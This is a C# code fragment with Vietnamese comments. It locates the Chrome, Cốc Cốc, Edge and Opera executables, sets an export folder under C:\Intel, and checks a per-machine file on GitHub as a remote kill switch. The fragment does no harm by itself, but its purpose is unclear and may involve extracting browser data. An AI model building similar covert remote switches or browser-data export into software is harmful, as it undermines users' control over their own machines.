string exportPath = @"C:\Intel\br";
// Dành cho Chrome và Cốc Cốc (64-bit thường nằm ở ProgramW6432)
var ChromePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
    "Google", "Chrome", "Application", "chrome.exe");

var CocCocPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
    "CocCoc", "Browser", "Application", "browser.exe");

// Dành cho Edge (thường nằm ở Program Files (x86))
var EdgePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
    "Microsoft", "Edge", "Application", "msedge.exe");

// Dành cho Opera (thường cài ở Local AppData)
var OperaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
    "Programs", "Opera", "opera.exe");

string url =
    $"https://raw.githubusercontent.com/vinhuptoday/brbn/main/{Helpers.Functions.GetUUID()}.txt?check={Guid.NewGuid().ToString()}";
using HttpClient client = new HttpClient();
try
{
    string content = await client.GetStringAsync(url);
    if (content.Contains("off"))
    {
        Environment.Exit(0);
    }
}
catch (Exception ex)
{

}
